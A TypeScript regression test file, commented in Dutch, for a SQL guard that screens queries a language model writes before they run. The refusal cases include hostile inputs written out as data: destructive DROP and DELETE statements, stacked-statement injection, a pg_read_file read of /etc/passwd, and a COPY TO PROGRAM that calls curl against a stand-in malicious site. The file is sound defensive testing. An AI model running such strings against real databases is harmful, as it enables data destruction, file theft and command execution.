import { test } from "node:test";
import assert from "node:assert/strict";
import { guardSql, MAX_ROWS } from "./sqlGuard.ts";

/**
 * Regressietest op de SQL-guard.
 *
 * Deze laag bepaalt mede of een door een taalmodel geschreven query wordt uitgevoerd,
 * dus elke wijziging eraan hoort hierlangs. Draaien met: npm test
 *
 * De "moet mogen"-gevallen zijn net zo belangrijk als de "moet niet mogen"-gevallen:
 * een guard die legitieme queries weigert, maakt de chat onbruikbaar en verleidt tot
 * het versoepelen van precies de regels die er wél toe doen.
 */

function toegestaan(sql: string) {
  const r = guardSql(sql);
  assert.equal(r.ok, true, `zou toegestaan moeten zijn: ${sql}`);
  if (r.ok) {
    assert.match(r.sql, new RegExp(`limit ${MAX_ROWS}$`), "rijlimiet ontbreekt");
  }
}

function geweigerd(sql: string) {
  assert.equal(guardSql(sql).ok, false, `zou geweigerd moeten worden: ${sql}`);
}

test("gewone leesqueries zijn toegestaan", () => {
  toegestaan("select sum(aantal) from v_verkopen where merk = 'DAF'");
  toegestaan("with x as (select 1 as a) select a from x");
  toegestaan("select 1;");
  toegestaan("SELECT * FROM v_verkopen");
  toegestaan("\n  select 1");
});

test("verboden woorden in tekst of commentaar blokkeren niet onterecht", () => {
  toegestaan("select * from v_verkopen where status = 'delete mij niet'");
  toegestaan("-- drop is hier gewoon tekst\nselect 1");
  toegestaan("/* update van de cijfers */ select 1");
  toegestaan("select * from v_verkopen where merk = 'O''Brien'");
});

test("schrijfoperaties worden geweigerd", () => {
  geweigerd("delete from verkopen_raw");
  geweigerd("insert into verkopen_raw values (1)");
  geweigerd("update verkopen_raw set merk = 'x'");
  geweigerd("drop table verkopen_raw");
  geweigerd("with x as (delete from verkopen_raw returning 1) select * from x");
});

test("meerdere statements worden geweigerd", () => {
  geweigerd("select 1; drop table verkopen_raw");
  geweigerd("select 1; -- ok\ndelete from verkopen_raw");
  geweigerd("select * from v_verkopen where 1=1; delete from verkopen_raw");
});

test("systeemtabellen en serverfuncties zijn buiten bereik", () => {
  geweigerd("select * from pg_catalog.pg_tables");
  geweigerd("select * from information_schema.columns");
  geweigerd("select pg_read_file('/etc/passwd')");
  geweigerd("select pg_sleep(60)");
  geweigerd("set role postgres");
  geweigerd("copy v_verkopen to program 'curl boze-site.nl'");
});

test("onzin wordt geweigerd", () => {
  geweigerd("   ");
  geweigerd("explain select 1");
  geweigerd(`select ${"1,".repeat(11000)}1`);
});
